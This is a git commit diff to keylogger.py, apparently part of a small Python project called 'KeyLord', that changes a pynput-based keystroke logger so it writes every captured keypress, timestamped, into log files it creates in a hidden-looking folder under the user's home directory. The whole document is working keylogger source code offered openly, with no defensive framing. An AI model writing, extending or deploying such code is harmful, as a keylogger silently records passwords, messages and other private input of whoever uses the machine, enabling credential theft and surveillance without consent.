4422fb212093dee475f83f20c45a5be75f8b7f1a
Tarcísio Marinho <tarcisio_marinho09@hotmail.com>
2019-08-02 14:58:49 -0300

    adding file interface

--- keylogger.py
+++ keylogger.py
@@ -1,26 +1,33 @@
 from pynput import keyboard
 import pynput
 from sys import argv
-import datetime
+import datetime, os, argparse
 # https://github.com/moses-palmer/pynput/issues/20
 
+
+
+home_path = os.environ.get('HOME')
+dir_name = 'keylord'
+keylord_path = os.path.join(home_path, dir_name)
 
 class logger:
 
     def __init__(self):
 
         # WORK AS STACK -> BACKSPACE = POP
+        self.__log_file = ''
         self.__buffer = []
         self.__listener = None
 
     def __print_formated(self):
         exact_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        print(exact_time + " " + ''.join(self.__buffer))
+        with open(self.__log_file, 'a') as f:
+            f.write(exact_time + " " + ''.join(self.__buffer))
         self.__buffer = []
 
-
-    def run(self):
-        with keyboard.Listener(on_press=self.on_press) as self.__listener:
+    def run(self, log_file):
+        self.__log_file = log_file
+        with keyboard.Listener(on_press=self.__on_press) as self.__listener:
             self.__listener.join()
 
 
@@ -39,23 +46,45 @@ class logger:
             elif(hasattr(key, 'char')):
                 self.__buffer.append(str(key).replace("'", ""))
             else:
-                self.__buffer.append(" " + str(key).replace("'", "").replace("Key.", "") + " ")
+                self.__buffer.append(str(key).replace("'", "").replace("Key.", "") + "+")
         
         # Stop keylogger
         # if(CONDITION):
         #     self.stop()
 
-    def on_press(self, key):
+    def __on_press(self, key):
         self.__write_to_buffer(key)
 
     def stop(self):
         self.__listener.close()
 
 
-def Parser(args):
+def create_keylogger_dir():
+    try:
+        os.mkdir(keylord_path)
+    except:
+        pass
+
+def create_log_file():
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
+
+    new_file = os.path.join(keylord_path, '%s.log' %(timestamp))
+    with open(new_file, 'w') as f:
+        f.write("KeyLord starting ...\n")
+    
+    return new_file
+
+
+
+def setup(args):
     #if(args.)
     pass
 
+
+
 if __name__ == "__main__":
+    create_keylogger_dir()
+    filename = create_log_file()
     l = logger()
-    l.run()
+    l.run(filename)
+
